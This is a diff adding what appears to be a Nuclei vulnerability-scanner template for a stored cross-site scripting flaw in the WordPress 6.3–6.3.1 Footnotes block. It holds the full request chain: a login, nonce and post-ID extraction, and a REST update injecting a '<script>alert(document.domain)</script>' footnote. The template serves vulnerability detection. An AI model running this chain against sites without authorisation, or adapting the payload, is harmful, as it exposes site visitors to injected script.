@@ -1,0 +1,86 @@
+id: wp-footnote-xss
+
+info:
+  name: WordPress 6.3-6.3.1 Footnotes Block - Cross-Site Scripting
+  author: nqdung2002
+  severity: medium
+  description: |
+    WordPress does not escape some of its Footnotes block options before outputting them back in a page/post where the block is embed.
+  impact: |
+    This could allow users with the contributor role and above to perform Stored Cross-Site Scripting attacks.
+  reference:
+    - https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-core/wordpress-core-63-631-authenticatedcontributor-cross-site-scripting-via-footnotes-block?asset_slug=wordpress
+    - https://wpscan.com/vulnerability/63270b61-dddd-4cc0-a091-a04cb4f682ec/
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:L/I:L/A:N
+    cvss-score: 6.4
+    cwe-id: CWE-79
+  metadata:
+    max-request: 4
+    framework: wordpress
+  tags: wpscan,xss,wp,wordpress,footnote,xss,authenticated
+
+http:
+  - raw:
+      - |
+        POST /wp-login.php HTTP/1.1
+        Host: {{Hostname}}
+        Origin: {{RootURL}}
+        Content-Type: application/x-www-form-urlencoded
+        Cookie: wordpress_test_cookie=WP%20Cookie%20check
+
+        log={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1
+
+      - |
+        GET /wp-admin/post-new.php HTTP/1.1
+        Host: {{Hostname}}
+
+      - |
+        POST /?rest_route=/wp/v2/posts/{{postid}} HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+        X-HTTP-Method-Override: PUT
+        X-WP-Nonce: {{nonce}}
+
+        {
+          "id": {{postid}},
+          "title": "Stored XSS via Footnote Block",
+          "content": "<!-- wp:paragraph -->\n<p>Test CVE<sup data-fn=\"testid\" class=\"fn\"><a href=\"#testid\" id=\"testid-link\">1</a></sup></p>\n<!-- /wp:paragraph -->\n\n<!-- wp:footnotes /-->",
+          "meta": {
+            "footnotes": "[{\"content\":\"<script>alert(document.domain)</script>\",\"id\":\"testid\"}]"
+          },
+          "status": "pending"
+        }
+
+      - |
+        GET /?p={{postid}} HTTP/1.1
+        Host: {{Hostname}}
+
+    host-redirects: true
+    max-redirects: 2
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code_4 == 200'
+          - 'contains(body_4, "<script>alert(document.domain)</script>")'
+          - 'contains(header_4, "text/html")'
+        condition: and
+
+    extractors:
+      - type: regex
+        name: postid
+        part: body_2
+        group: 1
+        regex:
+          - 'post=(\d+)'
+        internal: true
+
+      - type: regex
+        name: nonce
+        part: body_2
+        group: 1
+        regex:
+          - 'createNonceMiddleware\(\s"(.*)\"\s\)'
+        internal: true
+# digest: 490a004630440220547dfcb6171d8d0f79f2ab6f4f900c76d6d2d31de6ceb76a93937849592d157302202810e94413afa3a10a32140d50eab50980eaa27705f81c137424781ed0cc78f3:922c64590222798bb761d5b6d8e72950
